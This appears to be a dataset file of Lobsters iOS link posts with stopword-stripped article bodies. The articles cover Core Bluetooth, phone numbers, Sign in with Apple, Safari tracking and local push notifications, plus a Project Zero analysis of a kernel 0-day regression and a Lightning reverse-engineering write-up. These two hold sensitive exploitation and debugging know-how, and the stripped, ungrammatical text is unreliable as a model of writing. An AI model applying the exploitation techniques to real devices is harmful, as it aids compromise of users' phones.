determines peripheral device found support class service searching begin process connecting traditionally main service device advertised connection formed central query peripheral additional service offer order central determine compatible peripheral need know id value service peripheral support specific apps peripheral device make sense define service using shared uuid device however general practice make sense peripheral adopt bluetooth service standard capability globally example would make sense device record blood pressure reading could connected bluetooth device capable processing data regardless manufactured either device public database exists list standardized set service id used central peripheral want adopt specific use case characteristic given service number separate set information andor service might included within example heart rate sensor peripheral might feature heart rate service contained within service raw current heart rate value along information sensor positioned wearer time service may contain number characteristic record various type data perform various subfunctions service may used receive data peripheral send command back peripheral possible central explicitly query information characteristic register observer called every time characteristic update concept bluetooth device offering capability service characteristic officially called gatt short generic attribute profile core bluetooth concept summary hopefully point basic layout core bluetooth starting make sense parent device called central connect child device known peripheral peripheral manage capability service manage capability via characteristic putting practice discussed basic concept core bluetooth start putting practice demonstrating flow connecting two device built companion sample app around core bluetooth app basic chat app allows two device connect send message app demonstrates scan central advertise peripheral connected app send message upstream downstream one pipeline getting started starter anything else need add nsbluetoothalwaysusagedescription key app infoplist describing want use bluetooth key nt present would app rejected app store submission app throw exception trying call core bluetooth apis security requirement apple apps must get explicit permission user bluetooth enabled case let explain need bluetooth enable chat service access bluetooth allows chat others device place start using core bluetooth swift every source file integrates framework must following import statement import corebluetooth scanning central io device fill role central bluetooth connection represented object called cbcentralmanager begin let create new instance let centralmanager cbcentralmanager delegate self queue nil see object must designated delegate upon instantiation object must conform cbcentralmanagerdelegate upon instantiation central manager necessary activity needed start using bluetooth started immediately point ca nt start scanning yet bluetooth spends nontrivial amount time setting state could considered powered immediately must wait first delegate callback func centralmanagerdidupdatestate central cbcentralmanager guard centralstate poweredon else return centralmanagerdidupdatestate called every time state bluetooth system change include status bluetooth resetting access unauthorised reason productionready app every single state properly handled however case need detect state bluetooth reached powered happened start scanning scanning peripheral easy need call scanforperipherals specify service interested let service cbuuid string centralmanagerscanforperipherals withservices service option nil centralmanagerscanforperipherals withservices service option nil mentioned service carry unique identifier peripheral central may match core bluetooth identification handled via cbuuid object specific case use simple string identifier tutorial using uuid string value generated online uuid generator value need globally unique recognizable peripheral central side point device scanning peripheral matching service identifier point central checked scanning calling centralmanagerisscanning advertising peripheral central scanning need another device acting peripheral advertise service scanning similar central managed via cbcentralmanager peripheral managed instance cbperipheralmanager let peripheralmanager cbperipheralmanager delegate self queue nil exactly central manager peripheral manager require delegate upon creation time conforming cbperipheralmanagerdelegate also must wait state bluetooth device reach powered func peripheralmanagerdidupdatestate peripheral cbperipheralmanager guard peripheralstate poweredon else return state bluetooth peripheral powered peripheral start advertising let characteristicid cbuuid string let characteristic cbmutablecharacteristic type characteristicid property write notify value nil permission writeable let serviceid cbuuid string let service cbmutableservice type serviceid primary true servicecharacteristics characteristic peripheralmanageradd service peripheralmanagerstartadvertising cbadvertisementdataserviceuuidskey service cbadvertisementdatalocalnamekey device information fair bit unpack step one part time nothing complicated create characteristic assign standardised characteristic uuid central expecting also need explicitly mark characteristic writable central send data back peripheral create service object standardised service uuid set type primary ensure advertised main service peripheral advertise peripheral service uuid addition cbadvertisementdatalocalnamekey key normally hold device name peripheral modified hold additional data central could potentially use eg current temperature thermostat detecting peripheral central one device scanning one advertising service id able detect central side peripheral detected following delegate callback called func centralmanager centralmanager cbcentralmanager diddiscover peripheral cbperipheral advertisementdata string rssi rssi nsnumber centralmanagerconnect peripheral option nil selfperipheral peripheral diddiscoverperipheral provide lot interesting information peripheral advertisementdata dictionary contain information like device name manufacturer name addition service uuids defined cbadvertisementdataserviceuuidskey though may discover later necessary possible check peripheral support service central want checking value advertisementdata cbadvertisementdataserviceuuidskey addition rssi value received signal strength indicator useful determining distance peripheral sometimes may necessary require specific proximity proper functioning value used monitor happy peripheral one want connect call centralmanagerconnect begin connecting time since way access peripheral object outside delegate also good idea retain local property class connecting peripheral discovered peripheral called centralmanagerconnect central attempt connect following delegate method called func centralmanager centralmanager cbcentralmanager didconnect peripheral cbperipheral centralmanagerstopscan peripheraldelegate self let service cbuuid string peripheraldiscoverservices service point become responsible peripheral instead acting central manager object work directly peripheral object peripheral object type cbperipheral distinctly different cbperipheralmanager first thing assign delegate peripheral conforming cbperipheraldelegate receive event directly done call discoverservices peripheral let u confirm service support subsequently access service characteristic need discovering characteristic inside peripheral service set delegate peripheral performed request discover service following method cbperipheraldelegate called func peripheral peripheral cbperipheral diddiscoverservices error error let error error print unable discover service errorlocalizeddescription cleanup return let characteristic cbuuid peripheralservices foreach service peripheraldiscovercharacteristics characteristic service error occurs point must handle exit gracefully otherwise peripheral object populated service support like service identified via cbuuid object characteristic identified way subscribe characteristic start reading data contains must also discover member service addition peripheral multiple service becomes necessary iterate one discover one characteristic interested iterate service peripheralservices attempt discover characteristic want via id subscribing characteristic chat app interested passive stream data peripheral want notified immediately new data come need configure peripheral alert u whenever characteristic updated characteristic service discovered following delegate callback called func peripheral peripheral cbperipheral diddiscovercharacteristicsfor service cbservice error error let error error print unable discover characteristic errorlocalizeddescription cleanup return let characteristicuuid cbuuid servicecharacteristics foreach characteristic guard characteristicuuid characteristicuuid else return peripheralsetnotifyvalue true characteristic selfcharacteristic characteristic anything failed process first appropriate error handling moving secondly received service object since service number characteristic inside must loop discover main one want discovered characteristic want call peripheralsetnotifyvalue true order start getting notified data change confirming notification peripheral set one final step process peripheral report whether setting characteristic notify central successful whether succeeded failed following delegate triggered func peripheral peripheral cbperipheral didupdatenotificationstatefor characteristic cbcharacteristic error error let error error print characteristic update notification error errorlocalizeddescription return guard characteristicuuid characteristicuuid else return characteristicisnotifying print characteristic notification begun else print characteristic notification stopped disconnecting centralmanagercancelperipheralconnection peripheral nt think explicitly required implement method subscription failed would make sense detect attempt subscribe perform cleanup code needed point additionally central data pending would like send peripheral would best place send sending data peripheral central manager successfully able capture peripheral relevant characteristic central start sending data peripheral via characteristic one thing note characteristic must explicitly configured peripheral side writable central point possible send data peripheral calling let data messagestringdata using peripheralwritevalue data characteristic type withresponse type argument let specify whether want peripheral reply received data great discerning type data might explicitly required certain order data often repeated peripheral nt catch nothing value lost sending data central opposite side sending data central peripheral side similar method let data messagestringdata using peripheralmanagerupdatevalue data characteristic onsubscribedcentrals central receiving data peripheral finally ready start receiving data peripheral order notified new data arrived characteristic use following delegate func peripheral peripheral cbperipheral didupdatevaluefor characteristic cbcharacteristic error error let error error print characteristic value update failed errorlocalizeddescription return guard let data characteristicvalue else return let message string decoding data receiving data central last peripheral receives data central following method cbperipheralmanager called func peripheralmanager peripheral cbperipheralmanager didreceivewrite request cbattrequest guard let request requestsfirst let data requestvalue else return let message string decoding data one thing extra aware characteristic set writeable time creation sending data peripheral silently fail delegate never called summary going step obvious sending data core bluetooth involves quite step peripheral side peripheral configure advertise service characteristic manage central subscribe unsubscribe central side subscribing characteristic multistep process scanning peripheral connecting peripheral discovering peripheral service discovering service characteristic finally subscribing however said understand terminology object chain related next everything fall place relatively easily challenge chat app introduction core bluetooth api show general basic step connecting central peripheral writing chat app rather large hurdle appeared immediately central peripheral classic use case low powered sensor connected iphone role central peripheral clear cut however connection two iphones question play role suddenly becomes much harder decision one neat thing might obvious start core bluetooth make device central peripheral time meaning simultaneously scanning advertising device opened app device discovery screen create central manager peripheral manager begin scanning advertising time device range thing way device device detects shown onscreen likewise device detect device show device screen device discovery screen interested detecting available device could potentially chat go chat session window want receive message remote device selected case user tap device want talk hardware uuid selected device saved chat window opened holding copy uuid device opened chat window device set scan like standard central connection wo nt occur yet avoid detecting device advertising device discovery menu different service uuid used connection device performing scanning continues happen first time either participant chat submits message chat happens particular device becomes peripheral start advertising happens device detects first device connects central essence whoever chat first becomes peripheral whoever chat last remains central together sharing single connection advertisement saved hardware uuid used determine identity connecting device guarantee someone else different session happened start broadcasting nt accidentally join instead overall method might seem bit strange pragmatic level might make sense set maintain two connection device central connected another peripheral however practice unreliable two connection could potentially fail interference occurs technical reflection discussed core bluetooth api design pattern easy understand work said looked bare minimum getting core bluetooth moving would absolutely sufficient production app folk ditto use core bluetooth flagship product extension bluetooth low energy android support addition challenge limitation experienced project challenge ditto engineer faced well limited message size one thing completely glossed amount data sent characteristic hard limit limit change device historically byte modern phone hardware around byte chat app payload small per message nt much concern certainly something production app need take seriously core bluetooth capable detecting reporting acceptable length message device want send responsibility code chunk data send multiple message speed limitation maximum speed communicating via gatt actually kilobyte per second chat app limitation would never bump heavier application could quickly become bottleneck depending use case might optimize message payload efficient additional speed penalty reliable delivery writing data characteristic specifying withresponse attribute guaranteeing peripheral confirm received data roundhouse operation also incurs additional speed penalty use case require absolute top speed usually best rely unreliable delivery instead implement error correction logic different level control per platform core bluetooth instigates specific policy may apply equivalent ble implementation device android big example limitation core bluetooth imposes much sort data included advertising packet peripheral building product might equivalent android counterpart care must taken ensure interface behave way securityprivacy policy backgrounded apps regular bluetooth stack io function regardless onscreen activity apple implemented strict privacy policy apps adopting ble peripheral device app backgrounded continue advertise local name property longer included additionally backgrounded central longer receive repeating advertisement peripheral range particular limitation big point contention organization trying build contact tracing apps top core bluetooth extremely complex api work certainly becomes easier work time core bluetooth certainly nt easy framework get running quickly order start sending receiving data long process step need followed order slowly capture object need compounding step done via callback one another one time sometimes even one delegate daisychains new delegate case cbperipheral working process needed use case timeconsuming require high cognitive load demand bulletproof error checking handling point delegate callback process error could easily happen derail whole process wireless technology bluetooth prone interference randomly losing device delegate code need bulletproof error handling every step order handle issue potentially occur step process also potentially mean proactive heartbeat state check case expected callback fails occur occasional instability general odd behavior even though core bluetooth quite old point still occasional odd behavior happen quite reliably sometimes sending queue filled capacity callback say cleared sometimes skipped requires periodically testing queue see state certain specific device like ipad mini iphone potentially accidentally stop scanning locked unlocked lack encryption given form data transmitted bluetooth could quite private personal eg person health record encryption always strongly recommended form ble encryption exists reliable implementation might need consider writing encryption layer error correcting implication would entail conclusion first got chat app working text typed one phone automatically appeared felt absolutely magical fantastic time learning core bluetooth order write post hope found everything useful end one thing certainly clear implementing core bluetooth implementation hard involves lot step lot go wrong point user experience engineer researching core bluetooth looking build new product implement sort local communication instead rolling new implementation scratch recommend consider checking synchronization technology ditto ditto tech stack already taken care challenge listed would make integrating communication app breeze thanks reading sample app github repository
13,Lobsters,ios,Apple iOS,Dealing with phone numbers in contact book,https://ashishb.net/tech/dealing-with-phone-numbers-in-contact-book/,dealing phone number contact book,telephone country code prefixfree telephone number multiple representation std call multiple country share telephone code continuous area code country code always adjacent confirming phone number ownership like post navigation,building app us user contact book certain gotchas avoid telephone country code prefixfree country country code country get country code like scheme ensures number inherently unambiguous telephone number multiple representation since people dial internationally telecom system implicitly assume domestic call someone dialing u dialing person india dialing since international dialing would infrequent telecom require unique prefix number like distinguish whether someone country austria state even domestic area code explicitly required user might stored phone number telecom implicitly prefix user area code user want dial beyond area telecom operator would require additional prefix mark std call localization massive implication regarding processing cleaning normalizing phone number retrieved user contact book country code area code contain usually superfluous telecom might ok calling sending sm treat number like incorrect multiple country share telephone code usa canada many country caribbean share telephony code carrier would treat call sm international though italy vatican city share continuous area code country code always adjacent population grows certain area others code reserved region get allotted example san francisco bay area first allocated top existing area code deal growing population confirming phone number ownership never trust incoming call incoming sm phone number therefore way verify user owns phone number sending text message making phone call like like loading post navigation
14,Lobsters,ios,Apple iOS,How to unc0ver a 0-day in 4 hours or less,https://googleprojectzero.blogspot.com/2020/07/how-to-unc0ver-0-day-in-4-hours-or-less.html,hour le,,brandon azad project zero pm pdt may jailbreak released io latest signed version time release using zeroday vulnerability heavy obfuscation pm identified vulnerability informed apple sent apple poc analysis post take along journey initial identification wanted find vulnerability used report apple quickly order demonstrate obfuscating exploit little prevent bug winding hand bad actor downloading extracting ipa loaded main executable ida take look unfortunately binary heavily obfuscated finding bug statically beyond ability next loaded app onto ipod touch running io try running exploit exploring app interface nt suggest user sort control vulnerability used exploit device hoped support one use oobtimestamp bug instead io lower clicking jailbreak button thought occurred written kernel exploit understood memorycorruptionbased exploit something critical section kernel state corrupted system would unstable rest exploit continue whim double clicked home button bring app switcher killed app device immediately panicked panic cpu caller zone cache element used free element corrupted beginning expected found canary zone debugger message panic memory id o version kernel version darwin kernel version wed oct pdt root kernelcache uuid kernel uuid iboot version secure boot yes paniclog version kernel slide kernel text base machabsolutetime epoch time sec usec boot sleep wake calendar panicked task page thread pid panicked thread backtrace tid lr fp lr fp lr fp lr fp lr fp lr fp lr fp lr fp lr fp lr fp lr fp lr fp lr fp lr fp lr fp lr fp seemed promising panic message saying useafterfree allocation zone general purpose allocation size byte however possible symptom memory corruption rather source memory corruption even decoy investigate need analyze backtrace waiting ida process ipod kernelcache tried offthecuff experiment since many exploit use mach port fundamental primitive wrote app would churn ipcports zone creating fragmentation mixing freelist ran app afterwards exploit still worked suggesting may rely heap grooming mach port allocation next since panic log mentioned decided write app would continuously allocate free background exploit idea relies reallocating allocation app might grab slot instead would likely cause exploit strategy fail possibly result kernel panic sure enough app hammering background touching jailbreak button caused immediate kernel panic sanity check tried changing app hammer different zone instead time exploit ran successfully suggesting indeed critical allocation zone used exploit finally ida finished analyzing ipod kernelcache started symbolicating stacktraces collected panic log panicked task page thread pid panicked thread backtrace tid lr lr lr lr lr lr lr panic lr zcacheallocfromcpucache lr zallocinternal lr kalloccanblock lr aiocopyinlist lr liolistio lr unixsyscall lr slehsynchronous lr flehsynchronous lr call liolistio immediately stood long finished writing survey recent io kernel exploit happened remember liolistio vulnerable syscall used lightspeedbased exploit reread blog post synacktiv get sense bug immediately another piece fell place target object doublefreed lightspeed race aioliocontext object life also large number thread app supported idea race condition point felt enough evidence reach apple preliminary analysis suggesting bug lightspeed either variant regression confirmation poc next wanted confirm bug writing poc trigger issue tried original poc shown lightspeed blog post minute running nt yet panicked suggested perhaps variant original lightspeed bug find started two line investigation looking xnu source try spot bug using patch liolistio kernelcache running exploit source could nt see original vulnerability fixed nt make sense instead focused effort kernel patching booting patched kernelcache tricky doable downloaded booted ipod pongoos shell using example pongoos repo guide created loadable pongo module would disable kernel patch instead apply patch disabled kernel patch worried would detect engage antianalysis measure first test insert invalid instruction opcodes liolistio function would panic called surprisingly device booted fine clicked jailbreak panicked meant process calling liolistio next patched code responsible allocating aioliocontext object doublefreed original lightspeed bug would allocated instead mov patched str sp alloc size adrl add sp mov block bl kalloccanblock cbz mov liocontext mov sizet bl bzero idea increasing object allocation size cause exploit strategy fail try replace accidentallyfreed context object replacement object simply occur sure enough patch place stalled exploiting kernel step without actually panicking ran experiment patching various point function dump argument data buffer passed liolistio could compare value used original lightspeed poc idea noticed substantial difference would point direction variant source however field aioreqprio set gang difference argument passed liolistio original poc point looked like might actually original lightspeed bug variant returned original poc see perhaps reason nt triggering specific technique used mitigated code responsible reallocating allocation caught eye mandatory used make race likely poll force struct pollcontinueargs second dword collide liocontext ioissued technique quite slow waiting time better way exists int n poll null nt ever seen poll used reallocation primitive intuitively felt like using mach port based reallocation strategy promising replaced code outofline mach port spray copied oobtimestamp sure enough change required make poc trigger reliably second patch history working poc retried original lightspeed poc found would eventually panic left run long enough thus another case reintroduced bug could identified simple regression test let return source see figure happened mentioned earlier first checked xnu source see liolistio patch might broken actually could nt identify bug originally patched retrospect nt far original lightspeed blog post describes vulnerability well wo nt rehash highly recommend reading post high level bug semantics function free aioliocontext object unclear worker thread perform asynchronous io liolistio function could mentioned post original fix bug free aioliocontext object case might doublefreed one hand patch fix potential uaf liocontext hand error case handled fix ignored result possible make liolistio allocate aioliocontext never freed kernel give u silly do also crash recent kernel io included rest see future apple bother fix little do introduced patch turn apple eventually decide fix memory leak io appears reintroduced race condition doublefree case lionowait io issued must free rdar liocontext ioissued freecontext true break code io nt exactly io semantically equivalent anyone remembered understood original lightspeed bug could easily identified regression reviewing xnu source diffs anyone ran relatively simple regression test would found issue trivially summarize lightspeed bug fixed io patch nt address root cause instead turned race condition doublefree memory leak io memory leak identified bug fixed reintroducing original bug without addressing root cause issue security regression could found trivially running original poc blog post read regression followup post synacktiv blog conclusion combination sockpuppet regression io lightspeed regression io strongly suggests apple run effective regression test least old security bug public bug got lot attention running effective regression test necessity basic software testing common starting point exploitation still happy apple patched issue timely manner exploit became public reality attacker figure issue quickly long public poc released thus window opportunity exploit regression substantial also goal trying identify bug used demonstrate obfuscation block attacker quickly weaponizing exploited vulnerability turned lucky analysis experience writing kernel exploit let quickly figure alternative strategy find bug happened already familiar specific vulnerability used keeping track past exploit anyone business using exploit apple user would also advantage
15,Lobsters,ios,Apple iOS,Why AnyList Won‚Äôt Be Supporting Sign In with Apple,https://blog.anylist.com/2020/06/sign-in-with-apple,anylist supporting sign apple,enforcing new rule hide email privacy fundamental human right never massive security flaw like apple recent developer documentation explicitly state usage guideline facebook login recently caused huge number io apps crash contact u,starting june apple enforcing new rule app store requiring many apps support sign apple anylist one apps affected new rule mean must either implement sign apple make change app considering merit sign apple decided support understand may surprise customer like explain detail made decision thirdparty login system like sign apple cause many user experience customer support headache people remember login system used create account hmm created account couple year ago use email address facebook account sign apple simple question like reset password longer simple answer depend system used create account remember get locked account used thirdparty login system may able help instead direct another company hassle entail addition customer experience problem common thirdparty login system sign apple introduces several unique one problem apple id tied icloud email address account created via sign apple use icloud email address many icloud email address unused unchecked customer real email account gmail yahoo hotmail account try contact customer using icloud email address may never see message used run problem constantly customer support back anylist used builtin io email compose interface sending support request interface often default using icloud email account people would ask help reply contact u later angry never replied reply going icloud email account see ever looked gmail account gmail app another issue sign apple hide email feature feature create account u apple generate special email address account rather email address johndoe icloudcom see email address something like privaterelayappleidcom intriguing idea provides measure privacy practice creates numerous support user experience headache customer contact u asking support need look something account typically ask email address account hide email easily possible customer would figure privaterelayappleidcom email address used account furthermore platform anylist support sign apple like android someone want log account know privaterelayappleidcom email address certainly easy find longer io device create password u since able sign using sign apple finally service like anylist heavily focused sharing list people hide email option greatly complicates collaboration typically customer share list typing email address person want share person already account list instantly shared hide email option spouse friend obviously know privaterelayappleidcom email address enter email address system believe account point get email u asking create account accidentally create new account include work done existing account created via sign apple manage make mistake would link email address account created sign apple negating value hiding email address agree apple privacy fundamental human right understand hide email option sign apple wellintentioned feel like apple really think implication basic user experience customer support collaboration anylist respect privacy small company make money people like app pay make money creepy tracking selling information provide u email address never sold shared used invade privacy beyond customer experience also many problem sign apple creates u developer knockon effect customer first implementing support thirdparty login system like sign apple significantly increase complexity handling user account system instead one system common operation like creating account signing supporting thirdparty login system quickly turn account management code rat nest special logic necessary handle different login system especially true supporting multiple thirdparty login system eg facebook login google signin sign twitter etc make maintenance difficult errorprone place afford error securitycritical code like account management also time consuming implement support new thirdparty login system particularly small company like support app multiple platform enough u add sign apple io app also add web app mac app android app creating even complexity apple provide real solution supporting sign apple android see choose support sign apple mean spend significant amount time get working everywhere rather spending time improving core list recipe meal planning functionality app developer always duediligence evaluating security implication work last month massive security flaw reported sign apple serious apple paid person found read linked report see serious flaw also simple provide lot confidence something critical service logging account seem wise use immature service le year old recently subject serious security flaw another sign sign apple immaturity sad state documentation good documentation critical facilitating developer adoption service since apple expecting developer adopt service june seems reasonable expect decent documentation sadly like apple recent developer documentation sorely lacking example apple vaguely state implement sign apple android direct documentation understand apple probably care much android going provide login system going force developer multiplatform apps adopt providing real support major platform multiplatform apps run acceptable finally policy perspective apple explicitly state usage guideline apple reserve right disable sign apple website app reason time customer log account use service giving thirdparty powerful control core part service absolutely required unnecessarily risky view facebook login juncture may thinking point use anylist offer let sign facebook suffer many similar problem anyway new app store review guideline require support sign apple since offer facebook sign option excellent point absolutely true argument apply creating account via facebook also announcing removing facebook login anylist support signing using facebook begrudgingly added year ago experiment offering another signup option never enthusiastic become even true time go since facebook constantly seems upping ante creepy privacy practice use facebook sdk provide login functionality every new release sdk seems add new tracking option turned default take action disable furthermore facebook sdk quality problem recently caused huge number io apps crash due misconfigured server expect see anylist app update soon remove facebook login hope post helped explain supporting sign apple love hear feedback post comment question please contact u get back want informed new post available sign notified via email infrequent update spam
16,Lobsters,ios,Apple iOS,"An iOS, iPadOS, and macOS application reference manual for ARM assembly instructions",https://github.com/evilpenguin/ARMRef,io ipados macos application reference manual arm assembly instruction,join github today sign file permalink topic resource license reload reload,arm assembly reference manual io ipados macos dismiss join github today github home million developer working together host review code manage project build software together sign file permalink failed load latest commit information type name latest commit message commit time arm assembly reference manual io ipados macos topic resource license perform action time signed another tab window reload refresh session signed another tab window reload refresh session
17,Lobsters,ios,Apple iOS,Apple Lightning,https://nyansatan.github.io/lightning/,apple lightning,apple lightning lightning tristar hydra source hifive sdq idbus onewire protocol play interpreting idbus request response spbdimka hostid wake power handshake word esn tristar interface provisioning ezlink tristar tristar electric characteristic credit,apple lightning created little article almost everything know apple lightning related technology tristar hydra hifive sdq idbus etc first tiny warning read article risk information artcile based lot appleinternal material leaked datasheets schematic source code read diagonal direction course research warn reader never done research thus writeup might use incorrect weird term turn partially completely wrong going deeper let briefly sort term lightning lightning digital interface used apple io device since late replaced old connector see female port pinout picture connector pinout picture please pay attention fact connector pin side connector nt wired exact order thus host device detect orientation cable anything else though always applicable many lightning accessory played mirrored pinouts connector tristar hydra tristar integrated circuit embedded every device shipped lightning female port basically mux among many thing main purpose communicate lightning male connector one connected detect orientation detect accessory id route internal interface like usb uart swd accordingly hydra new variant tristar used since iphone significant change appears support wireless charging verified major tristarhydra variant known ti firstgen tristar used ipad mini ipad nxp firstgen tristar used iphone ipod touch nxp mysterious firstgen tristar used ipod nano source nxp secondgen tristar used since iphone apparently everything else nt support wireless charging multiple generation one x number generation nxp hydra used since iphone apparently everything else support wireless charging x number generation use term tristar keep mind also mean hydra well similar aspect gon na covered text hifive hifive lightning slave ie male connector contains logical element well chip known sdq idbus term often referred kind synonym convinience use term idbus seems correct technology called datasheet idbus digital protocol used negotiation tristar hifive similar onewire protocol play let sniff negotiation tristar hifive take logic analyzer lightning maletofemale passthrough breakout board accessory normal lightning usb cable would fit fine course device lightning port first connect logic analyzer channel id line breakout pin connect breakout device connect accessory yet right start sampling rate mhz fine see something like see tristar poll id line rotation one another since nt connect accessory polling obviously fails point device grow tired endless stream failure stop meanwhile let examine exactly happens polling first see long interval millisecond level high nothing else happening apparently time used charge internal hifive capacitor energy used powerup internal logic chip happens next far interesting obviously data flowing interpret decode let virtually split almost least least significant part something call word basically word combination fallrisefall meaningful stage time interval taken stage defines meaning word recovery stage time interval apparently required processing meaningful stage recieving side andor preparing next word sending stage table known word type time interval stage discussed unit microsecond meaningful recovery word min typ max min typ break wake zero one zero stop one stop stop used last bit byte using table build simple decoder protocol see first word host sends break tristar want send new request always start come data stage please pay attention fact last bit byte longer recovery stage data stage host sends another break slave must send reply least u delay see table tristar wait around m reply issued time interval tristar try poll another id line let examine data stage example requestresponse type always even request always odd response request type actual data empty request type byte whole data polynomial initial value let connect accessory setup see happens use apple original lightning usb cable appears idbus request hifive replied scroll see lot requestresponse pair request need response though interpreting idbus request response important idbus request used two purpose tell hifive enable full current case supported accessory ask pin configuration cable support metadata much known response data encoded bit available certain old tristar datasheet first byte response data accx dx data accx configuration id found accx hostreset hiz idbus hiz hiz hiz jtagdio jtagclk hiz hiz hiz high accx configuration id found accx hostreset hiz hiz idbus hiz hiz jtagdio jtagclk hiz hiz hiz high dx configuration id found dx hiz hiz hiz hiz hiz hiz hiz hiz hiz hiz dx configuration id found dx hiz hiz hiz hiz hiz hiz hiz hiz hiz hiz using table let decode cable id keeping mind id line found pin first byte cable response data accx dx data h accx meaning pin stick idbus dx meaning pin configured expected standard usb cable let sniff something interesting accessory id hostid dcsd kongswd astris running kongswd astris running kanziswd astris running kanziswd astris running haywire hdmi uart charge lightning mmearpods lightning full list idbus request provided spbdimka tip easily get accessory property including id using accctl apple internal utility shipped nonuiinternalui build easily run jailbroken device tip easily get cable pin configuration diags tristar p please note command available io diags tip easily track requestsresponses generated swdprobes setting debug env var astrisctl setenv debug cable virtual com see something like hostid one table could see mention thing called hostid value carried request appears might affect response hifive reply least set invalid value yes possible diags hifive might stop working though environmental variable called disableidcheck kongswdkanziswd firmware set make probe ignore invalid hostid important note kong kanzi feature hifive dedicated unreprogrammable chip instead accessory emulate using microcontroller andor fpga unit thus easily updatablereprogrammable wake table accessory id could see could notice kong kanzi send different response depending whether astris appleinternal software designed debugging swdprobes launched decode response using table find astris launched probe act like dcsd usb debug uart line debugging software running accid line switched swd want launch astris probe already connected device cable switch acc line swd wake break game hifive device emulates initiate wake idbus enumeration process start tristar send request kongkanzi reply new id tristar acknowledge route acc line internal swd line soc must development fusing demoted swd actually work course power handshake last thing going cover chapter power handshake algorithm based idbus requestsresponses kernel tristar driver use allowing charging accessory lightning cable lying somewhere connected chargercomputer connected device hifive limit current pwr really small value around according measurement enable full current request must issued tristar processed hifive secureromiboot enough kernel booted additional step made tristar issue request soon second one processed hifive reply sent disables current around millisecond time elapsed tristar issue another request data hifive process reply point kernel driver responsible tristar allow charging important note part know least one part mostly reversed thus careful information word esn tristar interface another feature tristar like tell esn esn little blob tristar store eeprom later retrieved idbus using serial number reader cable kanzi basically thing except different usb pid little bit different enclosure simple word sending blob ttrsapplecom get device serial number mechanism used apple storeapple premium reseller staff retrieve sn dead device considering tristar still alive though thing happening idbus retrieving esn already documented spbdimka provisioning procedure flashing esn tristar called provisioning provisioning done using diags device side using ezlink host side take step check provisioning status using diags tristar provstat retrieve esn well tristar esn way diags generally rich set tristar command available since io tristar tristar available address writing reading diags kernel driver communicate much publicly known register lot information register map obtained leaked iboot source code appears backwards compatible much write achieve interesting result another source knowledge diags tristar module easily extractable swd running example manage reverse algorithm reading provisioning state esn implemented addition iboot payload lina tried reverse esn writing algorithm well failed mechanism complex skill code snippet lina though available tristar electric characteristic tristar powered source line used idbus according oscilloscope better try interact idbus device like certain model arduino without level shifter credit spbdimka
18,Lobsters,ios,Apple iOS,No - Safari 14 Does Not Block Google Analytics,https://www.simoahava.com/analytics/no-safari-does-not-block-google-analytics/,safari block google analytics,safari block google analytics loading running website worldwide developer conference version privacy report crosssite tracker tracker prevented apple insider search engine journal myth debunked safari block resource load intelligent tracking prevention maciek stanasiuk tom anthony block prevents tracker cooky crosssite request thirdparty cooky privacy report work privacy report duckduckgo known google analytics firstparty analytics platform set final thought block prevent tracker devastating impact limit,let start proclaiming clarity sincerity safari version safari block google analytics loading running website midst apple yearly worldwide developer conference company showcased privacy improvement upcoming version safari web browser version fact biggest revelation new privacy report designed elucidate much browser working towards mitigating damage caused crosssite tracker better worse one preview showed googleanalyticscom listed among tracker prevented website queue panic spread misinformation like wildfire dry brush firstparty analytics apple insider quick report going far say browser completely block google search engine journal picked story saying specifically show google analytics blocked safari note search engine journal added footnote might got story wrong myth debunked safari block resource load intelligent tracking prevention itp work elegant john wilander webkit engineer charge itp saying itp started block resource load itp much block cooky early maciek stanasiuk tested whether hit actually blocked found opposite similarly tom anthony contributed research safari say block prevents tracker mean itp algorithm flagged domain crosssite tracking capability safari among thing stripped capability carry cooky crosssite request also known thirdparty cooky safari mean prevented known tracker googleanalyticscom domain flagged crosssite tracking domain safari assigns certain protective measure communication domain read prove point site googleanalyticscom googletagmanagercom flagged tracking domain still merrily loading javascript library sending http request designated endpoint privacy report work intelligent tracking prevention flag domain potential tracking domain detects request sent browser sufficient number unique domain safari browser sends request googleanalyticscom safari flag googleanalyticscom crosssite tracking capability itp hundred upon hundred domain regular safari user since introduction safari slowly close noose around crosssite tracker privacy report designed shed light process however instead listing domain flagged itp domain crossreferenced duckduckgo tracker list match found domain surfaced privacy report showcase itp blocking known tracker reading data really fact googleanalyticscom ability leverage thirdparty storage neutered mean nothing tool actually used google analytics firstparty analytics platform downloaded google server javascript library identifier stored firstparty cooky http request ga endpoint use identifier identifier alone specify source tracker thirdparty storage access used request googleanalyticscom mean might cooky set googleanalyticscom would imagine used debugging monitoring purpose example cooky would work safari browser target googleanalyticscom tracking domain final thought disappointed many thing right disappointed bit misinformation spread fast reputable journal took grainy screenshot couple influencer tweet jumped conclusion quoted social medium disappointed privacy report clumsy wording use term like block prevent tracker lead confusion aftermath wwdc showed unless clearly defined report know final version privacy report yet hopefully copy clarified disappointed took whole day install big sur macos beta external drive test something already knew true yes disappointed enough disk space available install big sur proper hard disk partition disappointed privacy report intelligent tracking prevention amazing job protecting safari user something devastating impact mishandled itp keep evolving morphing adjust crosssite tracking crowd google analytics user need worry safari google analytics require crosssite tracking capability safari block use naturally limit effective another story huge thanks folk like maciec stanasiuk tom anthony charles farina working rumor mill
19,Lobsters,ios,Apple iOS,Local area network push notifications,https://thomask.sdf.org/blog/2020/07/01/local-area-network-push-notifications.html,local area network push notification,apns year ago matrix certain video problem,theory push notification policy weirdly significant effect open source software architecture successful project challenging freeasinbeer decentralised model io chat app want monitor server realtime update prevented holding tcp connection open background also prevented polling update consistency reliable way get realtime update apns internetbased apple service person trigger update creator app architecture mean different people responsible client app server containing data creates range undesirable consequence find satisfactory solution effectively locked io market discussed detail year ago context matrix work around way long small double take spotted certain video claim io notification application server device network without internet hold mean apns picture selfhosted way deliver reliable push notification carte blanche every xmpp fediverse server implement push notification side way catch course catch main limitation work connected wifi network cell internet back apns able specify code list network ssids local push notification active perhaps thinking could fill information dynamically well maybe getting currently connected ssid problem say repeatedly video targeted specific use case messaging apps cruise ship particular context restriction make sense enough wiggle room solve problem much surprise much freedom app extension get tested beta appears get run whole time ssid implement whatever protocol want talk proprietary server pretty significant carveout protection apps draining battery requires entitlement assume flag special attention app store otherwise could imagine nefarious app already location access using cncopycurrentnetworkinfo together new feature track whenever user home work etc without actively using location permission possible decentralised project find niche us service selfhosted home lan could absolutely build client give push notification home however app let type ssid nothing say pas app store review unless happen live cruise ship
